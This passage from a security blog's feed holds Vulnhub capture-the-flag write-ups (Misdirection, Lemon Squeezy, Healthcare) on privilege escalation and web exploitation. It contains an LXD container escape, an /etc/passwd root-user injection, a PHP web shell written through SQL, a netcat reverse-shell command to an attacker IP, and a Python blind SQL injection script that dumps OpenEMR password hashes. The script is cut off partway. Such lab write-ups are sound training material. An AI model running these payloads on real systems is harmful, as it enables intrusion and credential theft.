&lt;p&gt;Then create the container to be privileged and mount the host os file system inside it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;lxc init alpine privesc -c security.privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
lxc config device add privesc host-root disk source&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/ path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/mnt/root recursive&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
lxc start privesc
lxc exec privesc /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this we can read the host file system from inside the container and can read root.txt.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;extras&#34;&gt;Extras&lt;/h2&gt;
&lt;p&gt;After looking at other writeups, there was another easy privesc that I didn&amp;rsquo;t explore.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Writeable /etc/passwd file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The passwd file is writeable by the users in the brexit group.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can add user with id 0 that will give us root privileges.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;openssl passwd -1 -salt user password123

echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/

https://www.hackingarticles.in/lxd-privilege-escalation/

https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Lemon Squeezy 1</title>
      <link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link>
      <pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;26 Apr 2020&lt;/td&gt;
&lt;td&gt;James Hay&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
script.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.134
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00014s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:FF:26:DE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;VMware&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p&gt;
&lt;p&gt;After performing a directory bruteforce using ffuf we get the following directories:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After logging into wordpress with the discovered credentials &lt;strong&gt;orange:ginger&lt;/strong&gt;, we find another password in drafts.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this password, we are able to login to phpmyadmin as the orange user.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Successful login:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;into&lt;/span&gt; outfile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can then verify that we have successful command execution, by running the whoami command.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
&lt;p&gt;Running the below curl command we are able to get a reverse shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After performing some manual local enumeration, we discover a cron job running as root.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /suidbash
chmod u+s /suidbash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;./suidbash -p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;It seems I forgot user.txt and it is in /var/www.&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;ul&gt;
&lt;li&gt;We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Healthcare 1</title>
      <link>https://blog.ikuamike.io/posts/2021/healthcare1/</link>
      <pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/healthcare1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;29 Jul 2020&lt;/td&gt;
&lt;td&gt;v1n1v131r4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;For this box, we perform directory bruteforce on the webserver to discover a vulnerable version of openemr. Openemr here
is vulnerable to sql injection that we leverage to extract usernames and password hashes. After cracking the hashes, we use the
discovered credentials to access the ftp server and upload a php reverse shell to the webserver. This serves as our initial
entry. To escalate our privileges we abuse a suid binary that doesn&amp;rsquo;t use absolute path in commands it&amp;rsquo;s running,
therefore we can hijack any of those commands and run any commands of our choosing as root.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.106
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00023s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; disallowed entries
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Coming Soon &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
Service Info: OS: Unix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;21-ftp&#34;&gt;21 (FTP)&lt;/h2&gt;
&lt;p&gt;Anonymous access is not enabled and the server version isn&amp;rsquo;t vulnerable to any known vulnerabilities.
We can look at this again when we have credentials.&lt;/p&gt;
&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Accessing this on the browser, we only get a static site with not much functionality.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we perform a directory bruteforce we get the following results:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ffuf -ic -c -u &#39;http://192.168.56.106/FUZZ&#39; -e / -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After checking the directories we have discovered, openemr returns an application. From their website:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenEMR is the most popular open source electronic health records and medical practice management solution.&lt;/p&gt;
&lt;/blockquote&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This version of openemr is outdated. Searching for available vulnerabilities and exploits for this version using searchsploit,
we discover an sql injection vulnerability.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Unfortunately the PoC provided doesn&amp;rsquo;t work. I found a better one from packetstormsecurity:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The PoC provided shows a blind sql injection. The below payload causes the request to delay for about 5 seconds.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&#39;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using this, I was able to create a script to extract username and password hash of all existing users. Soon to be
submitted to exploit-db.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Title: OpenEMR 4.1.0 - SQL Injection&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Date: 2021-04-03&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Author: Michael Ikua&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Vendor Homepage: https://www.open-emr.org/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Version: 4.1.0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   ____                   ________  _______     __ __   ___ ____
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  &amp;lt;  // __ &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    /_/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ____  ___           __   _____ ____    __    _
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;)

all &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;printable
&lt;span style=&#34;color:#75715e&#34;&gt;# edit url to point to your openemr instance&lt;/span&gt;
url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extract_users_num&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Finding number of users...&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if((select count(username) from users)=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
            user_length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Found number of users: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(user_length))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; user_length

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extract_users&lt;/span&gt;():
    users &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extract_users_num()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Extracting username and password hash...&amp;#34;&lt;/span&gt;)
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if(length((select+group_concat(username,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,password)+from+users+limit+0,1))=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#print(payload)&lt;/span&gt;
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
        &lt;span style=&#34;color:#75715e&#34;&gt;#print(r.request.url)&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
            length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
